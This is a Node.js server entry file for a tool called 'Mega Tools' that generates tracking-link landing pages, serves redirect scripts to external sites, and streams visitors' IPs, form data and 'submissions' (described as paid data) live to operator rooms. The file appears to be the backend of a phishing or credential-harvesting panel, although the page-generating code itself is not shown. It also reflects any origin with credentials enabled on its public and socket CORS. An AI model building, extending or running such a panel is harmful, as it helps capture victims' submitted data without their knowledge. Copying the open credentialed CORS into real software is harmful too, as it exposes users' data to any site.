// ============================================================
// MEGA TOOLS — MAIN SERVER ENTRY POINT (ENTERPRISE v10.4)
// ARCHITECTURE: Split CORS with correct middleware order
// - Public routes mounted FIRST with own CORS (credentials-enabled)
// - Strict CORS mounted only for remaining admin/auth routes
// - Unlimited external visitor pages (any domain)
// ============================================================
// FIX-S1..S14: retained from v10.3
// FIX-S15 (v10.4): start() now runs Session.consolidateByVisitor()
//                  once after db.connect(). This merges the 9+
//                  historical duplicate sessions (one visitorId =
//                  multiple sessions) into ONE canonical session,
//                  preserving ALL submissions. The duplicates are
//                  marked hiddenForAll=true (NOT deleted — paid
//                  data safe) so they vanish from the inbox while
//                  their submissions live on in the survivor.
// FIX-S16 (v10.4): consolidation is idempotent — a repeat call is
//                  a no-op once the collection is already clean.
// FIX-S17 (v10.4): consolidation logs summary so ops can see at
//                  a glance how many sessions were merged.
// FIX-S18 (v10.4): consolidation runs AFTER listen() so the server
//                  accepts requests immediately — migration happens
//                  in the background without blocking traffic.
// FIX-S19 (v10.4): /api/health now exposes consolidated flag +
//                  last consolidation result for quick verification.
// ============================================================

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });

const express = require('express');
const http = require('http');
const path = require('path');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');

const CONFIG = require('./config');
const db = require('./database');

const sessionManager = require('./services/sessionManager');
const Session = require('./models/Session');
const User = require('./models/User');
const { toStringId } = require('./utils/helpers');

const routes = require('./routes');

let landingHtmlCache = null;
let smartRedirectCache = null;
let megaRuntimeCache = null;

// FIX-S19: consolidation result state for /api/health
let consolidationState = { ran: false, merged: 0, groups: 0, error: null, at: null };

function getLandingHtml() {
  if (!landingHtmlCache) landingHtmlCache = require('./utils/landingHtml');
  return landingHtmlCache;
}

function getSmartRedirect() {
  if (!smartRedirectCache) smartRedirectCache = require('./utils/smartRedirect');
  return smartRedirectCache;
}

function getMegaRuntime() {
  if (!megaRuntimeCache) megaRuntimeCache = require('./utils/mega-runtime');
  return megaRuntimeCache;
}

process.on('uncaughtException', (err) => {
  console.error('[Server] UNCAUGHT EXCEPTION:', err.stack || err.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('[Server] UNHANDLED REJECTION:', reason?.stack || reason?.message || reason);
});

async function gracefulShutdown(signal) {
  console.log(`\n[Server] ${signal}. Shutting down...`);
  try { if (cleanupTimer) clearInterval(cleanupTimer); } catch (_) {}
  try { sessionManager.stop(); } catch (_) {}
  try { await db.close(); } catch (_) {}
  try {
    if (typeof server !== 'undefined' && server) {
      server.close(() => { console.log('[Server] Shutdown complete.'); process.exit(0); });
    } else {
      process.exit(0);
    }
  } catch (_) { process.exit(0); }
  setTimeout(() => { process.exit(1); }, 10000);
}

let socketEventSeq = 0;
function nextSocketSeq() { socketEventSeq++; return socketEventSeq; }

// ============================================================
// UNIVERSAL ORIGIN MATCHER (wildcard support)
// ============================================================
function isOriginAllowed(origin, allowedOrigins) {
  if (!origin) return true;
  const allowed = allowedOrigins || [];

  if (allowed.includes('*')) return true;
  if (allowed.includes(origin)) return true;

  let originHost = '';
  try {
    const u = new URL(origin);
    originHost = u.hostname.toLowerCase();
  } catch {
    return false;
  }

  for (const entry of allowed) {
    if (typeof entry !== 'string') continue;
    if (!entry.includes('*')) continue;

    let pattern = entry
      .replace(/^https?:\/\//i, '')
      .replace(/^www\./i, '')
      .trim();

    if (pattern.startsWith('*.')) {
      const suffix = pattern.slice(2).toLowerCase();
      if (!suffix) continue;
      if (originHost === suffix || originHost.endsWith('.' + suffix)) return true;
    } else if (pattern.endsWith('.*')) {
      const prefix = pattern.slice(0, -2).toLowerCase();
      if (!prefix) continue;
      if (originHost === prefix || originHost.startsWith(prefix + '.')) return true;
    } else if (pattern.includes('*')) {
      const regexStr = '^' + pattern.split('*').map(s => s.replace(/[.+?^${}()|[\]\\]/g, '\\$&')).join('.*') + '$';
      try {
        if (new RegExp(regexStr, 'i').test(originHost)) return true;
      } catch {}
    }
  }

  return false;
}

// ============================================================
// STRICT CORS — for authenticated admin endpoints
// ============================================================
const strictCorsOrigin = function (origin, callback) {
  if (!origin) return callback(null, true);

  if (isOriginAllowed(origin, CONFIG.ADMIN_ALLOWED_ORIGINS)) {
    return callback(null, true);
  }

  if (!CONFIG.IS_PRODUCTION) {
    console.warn('[CORS-Strict] Allowing unknown origin in dev:', origin);
    return callback(null, true);
  }

  console.warn('[CORS-Strict] Blocked origin:', origin);
  return callback(new Error('Not allowed by CORS'));
};

// ============================================================
// PUBLIC TRACKING CORS — reflect origin (credentials-compatible)
// ============================================================
const publicCorsOrigin = function (origin, callback) {
  return callback(null, true);
};

const ALLOWED_HEADERS = [
  'Content-Type',
  'Accept',
  'Accept-Language',
  'Authorization',
  'Cache-Control',
  'Pragma',
  'Expires',
  'X-Requested-With',
  'X-Request-Id',
];

const PUBLIC_CORS_OPTIONS = {
  origin: publicCorsOrigin,
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS', 'DELETE', 'PUT', 'PATCH'],
  allowedHeaders: ALLOWED_HEADERS,
  exposedHeaders: ['Set-Cookie', 'X-Request-Id'],
  maxAge: 86400,
};

const STRICT_CORS_OPTIONS = {
  origin: strictCorsOrigin,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ALLOWED_HEADERS,
  exposedHeaders: ['Set-Cookie', 'X-Request-Id'],
  maxAge: 86400,
};

const app = express();
app.set('trust proxy', 1);

if (CONFIG.IS_PRODUCTION) {
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "ws:", "wss:", "https:"],
        frameSrc: ["'self'"],
        fontSrc: ["'self'", "data:"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
      },
    },
  }));
} else {
  app.use(helmet({ contentSecurityPolicy: false }));
}

app.use(express.json({ limit: '5mb' }));
app.use(cookieParser());

const globalLimiter = rateLimit({
  windowMs: CONFIG.RATE_LIMIT_WINDOW_MS, max: CONFIG.RATE_LIMIT_MAX,
  message: { message: 'Too many requests, please try again later.' },
  standardHeaders: false, legacyHeaders: false,
  skip: (req) => {
    if (req.path === '/api/health') return true;
    if (req.headers.upgrade) return true;
    return false;
  },
});
app.use('/api/', globalLimiter);

app.use('/api/data', cors(PUBLIC_CORS_OPTIONS), routes.dataRoutes);
app.use('/api/webhook', cors(PUBLIC_CORS_OPTIONS), routes.webhookRoutes);
app.use('/api/redirect', cors(PUBLIC_CORS_OPTIONS), routes.redirectRoutes);

app.use(cors(STRICT_CORS_OPTIONS));

app.use((err, req, res, next) => {
  if (err && err.message === 'Not allowed by CORS') {
    return res.status(403).json({ message: 'CORS blocked: origin not allowed', origin: req.headers.origin || null });
  }
  return next(err);
});

app.use('/api/auth', routes.authRoutes);
app.use('/api/links', routes.linksRoutes);
app.use('/api/sessions', routes.sessionsRoutes);
app.use('/api/export', routes.exportRoutes);
app.use('/api/theme', routes.themeRoutes);
app.use('/api/upload', routes.uploadRoutes);
app.use('/api/trash', routes.trashRoutes);
app.use('/api/generate-page', routes.generatePageRoutes);

app.use('/uploads', express.static(path.join(__dirname, '..', '..', 'uploads')));
app.use('/generated-pages', express.static(path.join(__dirname, '..', 'data', 'generatedPages')));

const server = http.createServer(app);

const socketCorsOrigin = function (origin, callback) {
  if (!origin) return callback(null, true);
  return callback(null, true);
};

const io = socketIo(server, {
  cors: {
    origin: socketCorsOrigin,
    methods: ['GET', 'POST'],
    credentials: true,
    allowedHeaders: ALLOWED_HEADERS,
  },
  pingTimeout: 60000,
  pingInterval: 15000,
});

async function joinUserRooms(socket, user) {
  if (!user) return;
  try {
    const uid = toStringId(user._id);
    socket.join('user_' + uid);
    const trackingCodes = await User.getAccessibleTrackingCodes(user);
    for (const tc of trackingCodes) {
      if (tc) socket.join('room_' + tc);
    }
    if (user.role === 'owner') {
      const allUsers = await db.users.read();
      for (const u of allUsers) {
        if (u.trackingCode) socket.join('room_' + u.trackingCode);
      }
    }
    console.log(`[Socket] ${user.role} ${user.username || uid} joined ${trackingCodes.length} room(s)`);
  } catch (err) {
    console.error('[Socket] joinUserRooms error:', err.message);
  }
}

io.use(async (socket, next) => {
  try {
    const cookieStr = socket.handshake.headers.cookie || '';
    const tokenMatch = cookieStr.match(/auth_token=([^;]+)/);
    const token = tokenMatch ? tokenMatch[1] : (socket.handshake.auth?.token || '').replace('Bearer ', '');
    if (!token) { socket.user = null; socket.userId = null; socket.userRole = 'guest'; return next(); }
    const decoded = jwt.verify(token, CONFIG.JWT_SECRET);
    const allUsers = await db.users.read();
    const user = allUsers.find(u => toStringId(u._id) === decoded.id);
    if (!user) return next(new Error('User not found'));
    if (user.status === 'blocked') return next(new Error('Account blocked'));
    socket.user = user; socket.userId = toStringId(user._id); socket.userRole = user.role;
    next();
  } catch (err) { socket.user = null; socket.userId = null; socket.userRole = 'guest'; next(); }
});

const sessionSockets = {};
const SOCKET_CLEANUP_INTERVAL = 30000;
const DISCONNECT_GRACE_PERIOD = 2000;
let cleanupTimer = null;

function cleanupStaleSockets() {
  const connected = new Set();
  io.sockets.sockets.forEach(s => connected.add(s.id));
  for (const [key, socketId] of Object.entries(sessionSockets)) {
    if (!connected.has(socketId)) delete sessionSockets[key];
  }
}

function startSocketCleanup() {
  if (cleanupTimer) clearInterval(cleanupTimer);
  cleanupTimer = setInterval(cleanupStaleSockets, SOCKET_CLEANUP_INTERVAL);
}

function resolveSocketVisitorId(visitorId, clientIp, trackingCode) {
  if (visitorId && String(visitorId).trim()) return String(visitorId).trim();
  if (clientIp && clientIp !== 'unknown' && clientIp !== '::1') return 'ip_' + clientIp;
  if (trackingCode) return 'tc_' + trackingCode;
  return null;
}

function emitSessionDelta(io, trackingCode, sessionData) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  try { io.to('room_' + ownerCode).emit('sessionDelta', sessionData); } catch (_) {}
  try { io.to('room_' + trackingCode).emit('sessionDelta', sessionData); } catch (_) {}
}

io.on('connection', async (socket) => {
  const clientIp = socket.handshake.address || 'unknown';

  if (socket.userId) {
    User.updatePresence(socket.userId, true).catch(() => {});
    await joinUserRooms(socket, socket.user);
  }

  socket.on('session_init', async (data) => {
    const { trackingCode, visitorId } = data || {};
    if (!trackingCode) return;
    try {
      const baseCode = trackingCode.includes('_') ? trackingCode.split('_').pop() : trackingCode;
      const effectiveVisitorId = resolveSocketVisitorId(visitorId, clientIp, trackingCode);

      const result = await Session.upsert({
        visitorId: effectiveVisitorId,
        trackingCode,
        baseCode,
        entryUrl: baseCode,
        currentUrl: baseCode,
        ip: clientIp,
        browser: socket.handshake.headers['user-agent'] || 'Unknown',
        deviceType: 'Desktop',
        collectedTypes: ['session_init'],
      });

      if (!result || !result.session) {
        console.warn('[Socket] Rejected session_init — invalid trackingCode:', trackingCode);
        return;
      }

      const { session, isNew } = result;
      const sessionKey = effectiveVisitorId || (trackingCode + '_' + clientIp);
      sessionSockets[sessionKey] = socket.id;
      socket.sessionKey = sessionKey;
      socket.trackingCode = trackingCode;
      socket.visitorId = effectiveVisitorId;

      session.status = 'Online';
      session.isLive = true;
      session.lastActivity = new Date().toISOString();
      const sessionData = {
        type: isNew ? 'new' : 'updated',
        seq: nextSocketSeq(),
        timestamp: new Date().toISOString(),
        session: {
          _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
          isLive: session.isLive, status: session.status, lastActivity: session.lastActivity,
          clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
          baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
          ip: session.ip, browser: session.browser, formData: session.formData,
          redirectHistory: session.redirectHistory || [], lockedKeys: session.lockedKeys || [],
        },
      };
      emitSessionDelta(io, trackingCode, sessionData);
    } catch (err) { console.error('[Socket] Init error:', err.message); }
  });

  socket.on('session_heartbeat', async (data) => {
    const { visitorId, trackingCode } = data || {};
    if (!visitorId && !trackingCode) return;
    try {
      const effectiveVisitorId = resolveSocketVisitorId(visitorId, clientIp, trackingCode);
      const result = await Session.upsert({
        visitorId: effectiveVisitorId,
        trackingCode: trackingCode || '',
        baseCode: trackingCode || '',
        ip: clientIp,
        collectedTypes: ['heartbeat'],
      });
      if (!result || !result.session) {
        console.warn('[Socket] Rejected heartbeat — invalid trackingCode:', trackingCode);
      }
    } catch (err) { console.error('[Socket] Heartbeat error:', err.message); }
  });

  socket.on('joinRoom', async (trackingCode) => {
    if (!trackingCode) return;
    try {
      if (socket.userRole === 'guest') return;
      if (socket.userRole === 'owner') { socket.join('room_' + trackingCode); return; }
      const access = await User.getAccessibleTrackingCodes(socket.user);
      if (access.includes(trackingCode) || access.some(c => trackingCode.startsWith(c + '_'))) {
        socket.join('room_' + trackingCode);
      }
    } catch (err) { console.error('[Socket] joinRoom error:', err.message); }
  });

  socket.on('disconnect', async () => {
    if (socket.userId) User.updatePresence(socket.userId, false).catch(() => {});
    if (socket.sessionKey && sessionSockets[socket.sessionKey] === socket.id) {
      const keyToDelete = socket.sessionKey;
      setTimeout(() => { if (sessionSockets[keyToDelete] === socket.id) delete sessionSockets[keyToDelete]; }, DISCONNECT_GRACE_PERIOD);
    }
  });
});

startSocketCleanup();
app.set('io', io);
sessionManager.init(io, sessionSockets);

app.get('/api/health', async (req, res) => {
  const dbHealth = await db.health();
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    database: dbHealth,
    adminCorsOrigins: CONFIG.ADMIN_ALLOWED_ORIGINS.length,
    publicCorsOpen: CONFIG.PUBLIC_CORS_OPEN,
    publicCorsCredentials: PUBLIC_CORS_OPTIONS.credentials,
    allowedHeadersCount: ALLOWED_HEADERS.length,
    allowedHeaders: ALLOWED_HEADERS,
    // FIX-S19: consolidation status
    consolidation: consolidationState,
  });
});

app.get('/api/inbox-health', async (req, res) => {
  try {
    const allSessions = await db.sessions.read();
    const dbHealth = await db.health();
    const now = Date.now();
    const active = allSessions.filter(s => !s.hiddenForAll);
    const live = active.filter(s => s.isLive);
    const online = active.filter(s => s.status === 'Online');
    const expired = active.filter(s => (now - new Date(s.created_at || s.timestamp).getTime()) >= 86400000);
    const totalSubmissions = active.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    const uniqueVisitors = new Set(active.map(s => s.visitorId).filter(Boolean)).size;
    const socketCount = io.sockets.sockets.size;
    const memUsage = process.memoryUsage();
    res.json({ success: true, timestamp: new Date().toISOString(), uptime: Math.round(process.uptime()), database: dbHealth, sessions: { total: allSessions.length, active: active.length, live: live.length, online: online.length, expired: expired.length, uniqueVisitors, totalSubmissions }, socket: { connections: socketCount }, memory: { rss: Math.round(memUsage.rss / 1024 / 1024) + 'MB', heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + 'MB' }, config: { sessionTimeout: Math.round(CONFIG.SESSION_TIMEOUT_MS / 60000) + 'min', heartbeatInterval: Math.round(CONFIG.HEARTBEAT_INTERVAL_MS / 1000) + 's' } });
  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
});

app.post('/api/trigger-inbox-clean', async (req, res) => {
  res.json({ success: true, message: 'Auto-Clean is scheduled (24h) — manual trigger disabled.' });
});

app.post('/api/consolidate-now', async (req, res) => {
  try {
    const result = await Session.consolidateByVisitor();
    consolidationState = {
      ran: true,
      merged: result.merged || 0,
      groups: result.groups || 0,
      error: result.error || null,
      at: new Date().toISOString(),
    };
    res.json({ success: true, ...consolidationState });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/mega-redirect.js', (req, res) => {
  const { generateSmartRedirectScript } = getSmartRedirect();
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(generateSmartRedirectScript(req));
});

app.get('/mega-runtime.js', (req, res) => {
  const mod = getMegaRuntime();
  const fn = mod.generateMegaRuntime || mod.generateUnifiedRuntime;
  if (typeof fn !== 'function') {
    res.status(500).type('text/plain').send('// mega-runtime generator missing');
    return;
  }
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(fn(getServerBaseUrl(req)));
});

function getServerBaseUrl(req) {
  return CONFIG.IS_PRODUCTION ? (req.protocol + '://' + req.get('host')) : `http://localhost:${CONFIG.PORT}`;
}

function getOgMeta(req) {
  const baseUrl = getServerBaseUrl(req);
  const imageUrl = baseUrl + '/og-image.png';
  return `<meta property="og:title" content="Mega Tools"><meta property="og:description" content="Enterprise Visitor Management"><meta property="og:type" content="website"><meta property="og:url" content="${baseUrl}"><meta property="og:image" content="${imageUrl}"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Mega Tools"><meta name="twitter:description" content="Enterprise Visitor Management"><meta name="twitter:image" content="${imageUrl}">`;
}

function parseSlug(slug) {
  if (slug.includes('_')) {
    const parts = slug.split('_');
    if (parts.length === 2 && /^[a-z0-9]{6,9}$/i.test(parts[1])) {
      return { trackingCode: parts[0], baseCode: parts[1] };
    }
  }
  return { trackingCode: null, baseCode: slug };
}

async function getOwnerTrackingCode() {
  try {
    const allUsers = await db.users.read();
    const owner = allUsers.find(u => u.role === 'owner');
    return owner?.trackingCode || 'unknown';
  } catch { return 'unknown'; }
}

async function buildChainData(link) {
  if (!link || !link.is_chain || !Array.isArray(link.chain_links) || link.chain_links.length === 0) return null;
  const idx = Math.min(link.chain_current_index || 0, link.chain_links.length - 1);
  const step = link.chain_links[idx] || link.chain_links[0] || {};
  return {
    isChain: true,
    chainId: toStringId(link._id),
    chainStep: idx,
    chainStepName: step.name || '',
    chainUrl: step.url || '',
  };
}

app.get('/s/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const queryTC = req.query.tc || '';
    const parsed = parseSlug(slug);
    const searchCode = parsed.baseCode;
    const slugTC = parsed.trackingCode;
    const allLinks = await db.links.read();
    let link = allLinks.find(l => l.baseCode === searchCode || l.slug === searchCode || l.redirectCode === searchCode);
    if (!link) link = allLinks.find(l => (l.baseCode || l.slug || '').includes(searchCode));
    if (!link) return res.status(404).send('Link not found');
    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    let tc = queryTC || slugTC || link.ownerTrackingCode;
    if (!tc || tc === 'unknown') {
      tc = await getOwnerTrackingCode();
    }
    const code = link.baseCode || link.slug || searchCode;
    const { generateLandingPage } = getLandingHtml();
    const chainData = await buildChainData(link);
    let html = generateLandingPage({
      baseUrl: baseUrl || 'about:blank',
      trackingCode: tc + '_' + code,
      slug: code,
      apiBase: getServerBaseUrl(req),
      delay: 30000,
      heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS,
      chainData,
      req,
    });
    html = html.replace('</head>', getOgMeta(req) + '</head>');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) { console.error('[Server] /s/:slug error:', err.message); res.status(500).send('Server error'); }
});

app.get('/s/:slug/:trackingCode', async (req, res) => {
  try {
    const { slug, trackingCode } = req.params;
    const allLinks = await db.links.read();
    const link = allLinks.find(l => (l.baseCode || l.slug || '') === slug);
    if (!link) return res.status(404).send('Link not found');
    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    const code = link.baseCode || link.slug || slug;
    const { generateLandingPage } = getLandingHtml();
    const chainData = await buildChainData(link);
    let html = generateLandingPage({
      baseUrl: baseUrl || 'about:blank',
      trackingCode: trackingCode + '_' + code,
      slug: code,
      apiBase: getServerBaseUrl(req),
      delay: 30000,
      heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS,
      chainData,
      req,
    });
    html = html.replace('</head>', getOgMeta(req) + '</head>');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) { console.error('[Server] /s/:slug/:tc error:', err.message); res.status(500).send('Server error'); }
});

if (CONFIG.IS_PRODUCTION) {
  const distPath = path.join(__dirname, '..', '..', 'client', 'dist');
  app.use(express.static(distPath));
  app.get('*', (req, res) => { if (!req.path.startsWith('/api/') && !req.path.startsWith('/s/') && !req.path.startsWith('/generated-pages/') && req.path !== '/mega-redirect.js' && req.path !== '/mega-runtime.js') res.sendFile(path.join(distPath, 'index.html')); });
}

app.use((req, res) => { res.status(404).json({ message: 'Route not found' }); });
app.use((err, req, res, next) => { res.status(err.status || 500).json({ message: CONFIG.IS_PRODUCTION ? 'Internal server error' : err.message }); });

const PORT = CONFIG.PORT;

async function start() {
  console.log('[Server] MEGA TOOLS SERVER STARTING (ENTERPRISE v10.4)');
  console.log(`[Server] Port: ${PORT} | Env: ${CONFIG.NODE_ENV}`);
  console.log(`[Server] Admin CORS Origins: ${CONFIG.ADMIN_ALLOWED_ORIGINS.length} entries`);
  console.log(`[Server] Public CORS: OPEN (any origin, credentials enabled) for /api/data/* + /api/webhook/* + /api/redirect/*`);
  console.log(`[Server] Allowed Headers: ${ALLOWED_HEADERS.join(', ')}`);
  try { await db.connect(); } catch (err) { console.error('[Server] DB connect failed:', err.message); }
  const dbStatus = await db.health();
  console.log(`[Server] DB: ${dbStatus.type} (${dbStatus.database})`);

  server.listen(PORT, () => {
    console.log(`[Server] Server running on http://localhost:${PORT}`);

    // FIX-S15 + FIX-S18: run consolidation AFTER listen()
    // (server is accepting traffic immediately; migration runs in bg)
    setTimeout(async () => {
      try {
        console.log('[Server] Running one-time session consolidation...');
        const result = await Session.consolidateByVisitor();
        consolidationState = {
          ran: true,
          merged: result.merged || 0,
          groups: result.groups || 0,
          error: result.error || null,
          at: new Date().toISOString(),
        };
        if (result.merged > 0) {
          console.log(`[Server] ✅ Consolidated ${result.merged} duplicate sessions across ${result.groups} visitor groups`);
        } else {
          console.log('[Server] No duplicate sessions found (clean state)');
        }
      } catch (err) {
        console.error('[Server] Consolidation error:', err.message);
        consolidationState = { ran: true, merged: 0, groups: 0, error: err.message, at: new Date().toISOString() };
      }
    }, 3000); // 3s after listen — gives DB a moment to settle
  });
}

start();

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

module.exports = app;